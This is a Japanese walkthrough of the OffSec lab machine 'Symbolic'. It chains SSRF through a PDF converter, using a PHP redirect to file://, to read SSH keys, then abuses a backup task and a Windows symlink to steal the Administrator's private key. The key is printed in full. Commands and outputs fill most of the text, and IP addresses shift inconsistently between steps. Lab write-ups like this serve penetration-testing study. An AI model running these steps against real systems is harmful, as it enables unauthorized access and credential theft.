**ウォークスルー**

Symbolicの活用ガイド

概要

このウォークスルーでは、ウェブサーバーのローカルファイルインクルード脆弱性を悪用して標的を攻撃します。その後、自動バックアップタスクとWindowsのシンボリックリンクを利用してアクセス権限を昇格します

列挙

Nmap開いているポート、実行中のサービス、およびそれらのバージョンをすべて特定するためのスキャンから列挙プロセスを始めましょう

==🟢┌──(kali㉿kali)-\[~\]  
└─$ nmap -Pn -sV -sC -p- 192.168.120.204  
Starting Nmap 7.92 (== ==🟢https://nmap.org== ==🟢) at 2022-04-05 16:51 IST  
Nmap scan report for 192.168.120.204  
Host is up (0.21s latency).  
Not shown: 65531 filtered tcp ports (no-response)  
PORT     STATE SERVICE VERSION  
22/tcp   open  ssh     OpenSSH for_Windows_7.7 (protocol 2.0)  
\| ssh-hostkey:   
\|   2048 72:e6:6c:53:50:86:eb:91:14:fd:f9:95:21:b4:40:06 (RSA)  
\|   256 d6:19:32:12:86:97:85:71:42:d9:3e:b9:cf:ed:40:0c (ECDSA)  
\|_  256 e9:1f:b3:60:e1:c0:fc:a4:be:ec:fd:32:70:39:76:c7 (ED25519)  
80/tcp   open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)  
\|_http-title: WebPage to PDF  
\| http-methods:   
\|_  Potentially risky methods: TRACE  
\|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7  
5357/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
\|_http-title: Service Unavailable  
\|_http-server-header: Microsoft-HTTPAPI/2.0  
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
\|_http-title: Not Found  
\|_http-server-header: Microsoft-HTTPAPI/2.0  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows==

==🟢Service detection performed. Please report any incorrect results at== ==🟢https://nmap.org/submit/== ==🟢.  
Nmap done: 1 IP address (1 host up) scanned in 287.05 seconds==

ポート22、80、111、5357、5985が開いていることがわかりました。これらの開いているポートで実行されているサービスを列挙し、エクスプロイトに役立つ情報を取得してみましょう。

Nmapスキャンの結果、port 80ターゲットマシンでが開かれており、Apache httpd 2.4.48サービスが実行中であることがわかりました。Webブラウザで確認してみましょう。

次の情報と機能を備えた Web ページが表示されます。

- 「Webpage to PDF Converter by p4yl0ad」という見出し。
- Web ページは URL を入力として受け取り、Web ページの PDF を生成します。
- 「ここにURLを入力してください」入力フィールドの下に「Powered by WkhtmltoPdf」というメッセージが表示されます。

足場を築く \[SSRF から LFI\]

file://URL入力フィールドに文字列を入力してローカルファイルを読み込もうとしたところ、エラーメッセージが表示されました。そこで、SSRFリダイレクト機能を使ってローカルファイルを読み込んでみましょう。

==🟢> Server Side Request Forgery (SSRF) is a web security vulnerability that allows an attacker to persuade the target server to make requests to a location which cannot be accessed from outside.==

[PDF生成によるSSRF攻撃](https://www.jomar.fr/posts/2021/ssrf_through_pdf_generation/)で述べたように、PDFを生成するウェブアプリケーションはSSRF攻撃に対して脆弱です。細工したPHPファイルをターゲットに送信することで、外部からのアクセスが制限されているファイルにアクセスできるようになります。

続行する前に、ホスト システムの**/var/www/html**の場所に**index.php**という PHP ファイルを作成する必要があります。

==🟢\<?php  
header('Location:== ==🟢file:///Windows/win.ini'====🟢);  
?>==

Apacheここで、 （以前にインストールされていない場合は）インストールして起動する必要があります。

==🟢sudo apt install -y apache2 php  
service apache2 start==

Apache サービスを開始した後、ターゲット マシンにリクエストを送信します。

==🟢┌──(kali㉿kali)-\[~\]  
└─$ curl -i -s -k -XPOST --data-binary 'url=192.168.36.128%2Findex.php' '====🟢http://192.168.36.131/Process.php====🟢'  
HTTP/1.1 302 Found  
Date: Mon, 11 Oct 2021 17:27:27 GMT  
Server: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7ls==

==🟢X-Powered-By: PHP/8.0.7  
Location: /pdfs/f6397aa234afd83b85f1f34adaf9352d.pdf  
Content-Length: 0  
Content-Type: text/html; charset=UTF-8==

アプリケーションによって生成された出力PDFファイルには、**index.php**ファイルで指定した**Windows/win.ini**の内容が含まれています。これにより、この手法を使用してローカルファイルを読み取ることができることが確認されました。

スキャン結果からNmap、ターゲットマシン上でサービスが稼働していることが分かりSSH、Webアプリケーションで「p4yl0ad」というユーザー名が特定されました。このユーザーのSSHキーを読み取ってみましょう。

SSH キーにアクセスできるように**index.php**ファイルを変更します。

==🟢\<?php  
header('Location:== ==🟢file:///Users/p4yl0ad/.ssh/id_rsa'====🟢);  
?>==

ここで、前と同じようにファイルをターゲット サーバーに送信します。

==🟢┌──(kali㉿kali)-\[~\]  
└─$ curl -i -s -k -XPOST --data-binary 'url=192.168.36.128%2Findex.php' '====🟢http://192.168.36.131/Process.php====🟢'  
HTTP/1.1 302 Found  
Date: Mon, 11 Oct 2021 17:39:36 GMT  
Server: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7  
X-Powered-By: PHP/8.0.7  
Location: /pdfs/f6397aa234afd83b85f1f34adaf9352d.pdf  
Content-Length: 0  
Content-Type: text/html; charset=UTF-8==

アプリケーションによって生成された出力PDFファイルには、「p4yl0ad」ユーザーのSSHキーが含まれています。このキーを使ってSSH経由でサーバーに接続してみましょう。

==🟢┌──(kali㉿kali)-\[~\]  
└─$ ssh -i deployment_key.txt p4yl0ad@192.168.36.131  
Microsoft Windows \[Version 10.0.17763.737\]                                                                                                                                                                           
(c) 2018 Microsoft Corporation. All rights reserved.==

==🟢p4yl0ad@SYMBOLIC C:\Users\p4yl0ad>whoami  
symbolic\p4yl0ad==

==🟢p4yl0ad@SYMBOLIC C:\Users\p4yl0ad>hostname  
SYMBOLIC==

==🟢p4yl0ad@SYMBOLIC C:\Users\p4yl0ad>cd Desktop==

==🟢p4yl0ad@SYMBOLIC C:\Users\p4yl0ad\Desktop>dir   
 Volume in drive C has no label.                   
 Volume Serial Number is 5C30-DCD7                 
                                                   
 Directory of C:\Users\p4yl0ad\Desktop             
                                                   
04/04/2022  01:52 AM    \<DIR>          .           
04/04/2022  01:52 AM    \<DIR>          ..          
04/04/2022  01:52 AM                34 local.txt   
               1 File(s)             34 bytes      
               2 Dir(s)       7,221,248 bytes free==

これで、ターゲット システムへのシェル アクセスが可能になりました。

エスカレーション

[PrivescCheck](https://github.com/itm4n/PrivescCheck)を使用して、このWindowsホストの設定問題を列挙してみましょう。スクリプトをKaliマシンに複製し、ターゲットマシンに転送しましょう

==🟢┌──(kali㉿kali)-\[~/Downloads\]  
└─$ sudo git clone== ==🟢https://github.com/itm4n/PrivescCheck.git==  
==🟢...  
┌──(kali㉿kali)-\[~/Downloads\]  
└─$ scp -i deployment_key.txt /home/kali/Downloads/PrivescCheck/PrivescCheck.ps1 p4yl0ad@192.168.120.235:C:\Users\p4yl0ad\Documents/PrivescCheck.ps1  
PrivescCheck.ps1                                                                                        100%   90KB  85.3KB/s   00:01==

ターゲットのシェルに戻り、**PrivescCheck.ps1**を実行してみましょう。

==🟢C:\Users\p4yl0ad\Documents>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"==

管理者として実行されている興味深いサービスを発見しました。

==🟢Name        : BackupLogService                                                                                                                                                                                       
DisplayName : BackupLogService                                                                                                                                                                                       
ImagePath   : C:\Program Files\nssm-2.24\win64\nssm.exe                                                                                                                                                              
User        : .\Administrator                                                                                                                                                                                        
StartMode   : Automatic==

**さらに、 C:\backup**にバックアップ フォルダーがあります。

==🟢p4yl0ad@SYMBOLIC C:\>dir   
 Volume in drive C has no label.  
 Volume Serial Number is CCC2-BF17==

==🟢Directory of C:\==

==🟢10/11/2021  10:19 AM    \<DIR>          backup  
09/15/2018  12:19 AM    \<DIR>          PerfLogs  
10/11/2021  10:16 AM    \<DIR>          Program Files  
07/29/2021  01:00 PM    \<DIR>          Program Files (x86)  
10/11/2021  10:08 AM    \<DIR>          Users  
07/29/2021  01:01 PM    \<DIR>          Windows  
10/11/2021  10:16 AM    \<DIR>          wkhtml  
10/11/2021  10:15 AM    \<DIR>          xampp  
               0 File(s)              0 bytes  
               8 Dir(s)  50,800,500,736 bytes free==

==🟢p4yl0ad@SYMBOLIC C:\>cd backup==

==🟢p4yl0ad@SYMBOLIC C:\backup>dir   
 Volume in drive C has no label.   
 Volume Serial Number is CCC2-BF17==

==🟢Directory of C:\backup==

==🟢10/11/2021  10:19 AM    \<DIR>          .  
10/11/2021  10:19 AM    \<DIR>          ..  
10/11/2021  09:11 PM               207 backup.ps1  
10/11/2021  10:47 AM    \<DIR>          logs  
               1 File(s)            207 bytes  
               3 Dir(s)  50,800,500,736 bytes free==

**このディレクトリにはbackup.ps1**というファイルがあります。このファイルの内容を確認してみましょう。

==🟢p4yl0ad@SYMBOLIC C:\backup>type backup.ps1   
$log = "C:\xampp\htdocs\logs\request.log"   
$backup = "C:\backup\logs"==

==🟢while($true) {  
        \# Grabbing Backup  
        copy $log $backup\$(get-date -f MM-dd-yyyy_HH_mm_s)  
        Start-Sleep -s 60  
}==

**コードがC:\xampp\htdocs\logs**から**request.log**をコピーし、 1 分ごとに**C:\backup\logs**に配置していることがわかります。

シンボリックリンクを介したサービスの悪用

シンボリックリンクとは、別のファイルオブジェクトを指すファイルオブジェクトです。指し示されるオブジェクトはターゲットと呼ばれます。ユーザーは**htdocs**p4yl0ad内のlogsフォルダに対して完全な権限を持っているため、これを利用して、読み取りたい他のファイルへのシンボリックリンクを作成できます。logs**フォルダ**のセキュリティ記述子を表すオブジェクトを取得してみましょう。

Get-Aclファイルまたはリソースのセキュリティ記述子を表すオブジェクトを取得するコマンドレットを使用しましょう。

==🟢PS C:\backup>poweshell Get-Acl C:\xampp\htdocs\logs | fl==

==🟢Path   : Microsoft.PowerShell.Core\FileSystem::C:\xampp\htdocs\logs   
Owner  : BUILTIN\Administrators  
Group  : SYMBOLIC\None  
Access : SYMBOLIC\p4yl0ad Allow  FullControl  
         SYMBOLIC\p4yl0ad Allow  FullControl  
         NT AUTHORITY\SYSTEM Allow  FullControl  
         BUILTIN\Administrators Allow  FullControl  
         BUILTIN\Users Allow  ReadAndExecute, Synchronize  
         BUILTIN\Users Allow  AppendData  
         BUILTIN\Users Allow  CreateFiles  
         CREATOR OWNER Allow  268435456==

**シンボリックリンクを作成する前に、 request.log**ファイルと同じフォルダー内のその他のものを削除する必要があります。

==🟢PS C:\windows\tasks> del "C:\xampp\htdocs\logs"==

==🟢Confirm  
The item at C:\xampp\htdocs\logs has children and the Recurse parameter was not specified. If you continue, all children will be removed with the item. Are you sure you want to continue?  
\[Y\] Yes  \[A\] Yes to All  \[N\] No  \[L\] No to All  \[S\] Suspend  \[?\] Help (default is "Y"): Y==

次に、シンボリックリンクを作成する必要があります。管理者権限なしでこれを行うには、Mount PointC **:\xampp\htdocs\が\RPC Control\**オブジェクトディレクトリを指すようにシンボリックリンクを作成します。次に、 **\RPC Control\logs**が**\?\C:\Users\Administrator.ssh\id_rsa**を指すようにシンボリックリンクを作成します。

[これは、Windowsの様々なシンボリックリンクタイプをテストするためのツールであるsymboliclink-testing-tools を](https://github.com/googleprojectzero/symboliclink-testing-tools/releases/download/v1.0/Release.7z)使用することで可能です。7zipファイルをKaliマシンに保存し、解凍する必要があります。

==🟢┌──(kali㉿kali)-\[~\]  
└─$ sudo 7za e Release.7z  
7-Zip (a) \[64\] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21  
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i5-1038NG7 CPU @ 2.00GHz (706E5),ASM,AES-NI)==

==🟢Scanning the drive for archives:  
1 file, 197274 bytes (193 KiB)==

==🟢Extracting archive: Release.7z  
--  
Path = Release.7z  
Type = 7z  
Physical Size = 197274  
Headers Size = 455  
Method = LZMA2:1536k BCJ  
Solid = +  
Blocks = 2==

==🟢Everything is Ok==

==🟢Files: 14  
Size:       1442410  
Compressed: 197274==

**CreateSymlink.exe**ファイルをターゲット マシンに移動する必要があります。

==🟢┌──(kali㉿kali)-\[~\]  
└─$ scp -i deployment_key.txt /home/kali/Downloads/CreateSymlink.exe p4yl0ad@192.168.120.235:C:\Windows\Tasks/CreateSymlink.exe==

次にシンボリックリンクを作成します。

==🟢PS C:\windows\tasks> ./CreateSymlink.exe "C:\xampp\htdocs\logs\request.log" "C:\Users\Administrator\.ssh\id_rsa"  
Opened Link \RPC Control\request.log -> \??\C:\Users\Administrator\.ssh\id_rsa: 00000154  
Press ENTER to exit and delete the symlink==

数分後、**C:\backup\logs**にアクセスしてログを読み取ることができます。

==🟢p4yl0ad@SYMBOLIC C:\backup\logs>type 10-11-2021_10_59_20   
-----BEGIN OPENSSH PRIVATE KEY-----  
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn   
NhAAAAAwEAAQAAAQEAqH5suZzgOsiF1KShlQM6BqYc4eheP78shoUYqpL/oe43c4eACPAw   
n8ccS0emiVei942Ff/EptW7Jw/ta0cL06xJYH0x2QiMvZjPYUUjFxpZQMhdDRj+w1Ak1TS   
cIkAaBwHtzok5pLrN4dqTGJKuwkM95Tr6j3bfCqhXIyjI2T5+kjKBH8m7vr9QtkyTfwKIl   
Z1hxRWRFmvqLFIJrtY+FKmkir74duT7qvd2Aw7C8u1xVvvWHW6nHLqRQRcpUB/yaBz9iwQ   
pcZnUGUDK2qv1Zwj/6Z6da4y/PBzvFrEhOa5EFpuuB0Q1TdErrF7wllfzpVCINm1bg9Nep   
fukupefb1QAAA9DBeaYKwXmmCgAAAAdzc2gtcnNhAAABAQCofmy5nOA6yIXUpKGVAzoGph   
zh6F4/vyyGhRiqkv+h7jdzh4AI8DCfxxxLR6aJV6L3jYV/8Sm1bsnD+1rRwvTrElgfTHZC   
Iy9mM9hRSMXGllAyF0NGP7DUCTVNJwiQBoHAe3OiTmkus3h2pMYkq7CQz3lOvqPdt8KqFc   
jKMjZPn6SMoEfybu+v1C2TJN/AoiVnWHFFZEWa+osUgmu1j4UqaSKvvh25Puq93YDDsLy7   
XFW+9YdbqccupFBFylQH/JoHP2LBClxmdQZQMraq/VnCP/pnp1rjL88HO8WsSE5rkQWm64   
HRDVN0SusXvCWV/OlUIg2bVuD016l+6S6l59vVAAAAAwEAAQAAAQBdN+SrJDGiFAKGzLZg   
nLJjr09XZJmQJxJZMhWdeUpYqlSfZB3f1BLystPiijeG0Kdm0jNDv4bVy/9woAV0+6lIzJ   
NYbZMXsCOvJYvOHLbe0ZZ4wAoGOYJ5LMcCck/4bsEmXqZw63Sh08UXzr2Y2CwNUdvJRwud   
xOa79uVpiDIoBkLCq+A/COTKIinsAFRoZV8KbSwen2h/ccBIrdPQrIydaxbZ8RciT3Y+2t   
ZP2LAXiENw4jcP5RaUz6FaBYv+GUjRLcjzTd0uM4BAco9tdl+itSBc5GkwDJx9mUp1b2o+   
E+earEvIb7rr7kLc7tFGD1eHis2tIo1KzDYG0WN6Oq7ZAAAAgFxGPzkZmO1Dl413IekdqR   
lGHYTBSu5e2nFj7G2V0oS6Q6UNktpgNToLaHrktBCHx0FNe3c0bgLJOW1OV9H8mUiBQgyr   
LOiXx0hWALQFRDiYEc/uPbst+9226Wbsqv+YjgPtRGpNIitPZs2Tl7RWGinn47b3G6mKQI   
yOGsCj4hINAAAAgQDUirv9D9m38JQGBXVUn/RHonXfCHFTW7AcdmId6L6QDK8sXwl0U5WM   
UhY9mhMRLaodRmPq0AyFIxOaLbeZxgzh3yDsHDc1mAHWynvBx24rNL7MT2W9DGfZNc56ht   
+wKkCVjQdZxry/s05wzU7RYX211Kzj0xD2F433yx7MTFV9KwAAAIEAyvILIgppBSwlKzlI  
WBpwcZ4bcmWJQbNANdy87kgsxwLezVCNAJWj/7kjygcRnkc3NJubAJsssiqzXPbwW13msI  
cxC7nUxadCYVPY/ThbgVnNWvw/tawJxkVniCEzlPeSvQOmvalVw5zFhvaFr6zC4tizPqdT  
wMY0GOfUpehViv8AAAAWYWRtaW5pc3RyYXRvckBTWU1CT0xJQwECAwQF  
-----END OPENSSH PRIVATE KEY-----==

これで、管理者の SSH キーを使用して SSH 経由でサーバーに接続できるようになります。

==🟢┌──(kali㉿kali)-\[~\]  
└─$ ssh -i id_rsa Administrator@192.168.36.131                                                                                                                                                               
Microsoft Windows \[Version 10.0.17763.737\]                                                                                                                                                                           
(c) 2018 Microsoft Corporation. All rights reserved.==

==🟢administrator@SYMBOLIC C:\Users\Administrator>whoami   
symbolic\administrator==

==🟢administrator@SYMBOLIC C:\Users\Administrator>hostname  
SYMBOLIC==

==🟢administrator@SYMBOLIC C:\Users\Administrator>==

貼り付け元  \<https://portal.offsec.com/machine/symbolic-38080/overview/details>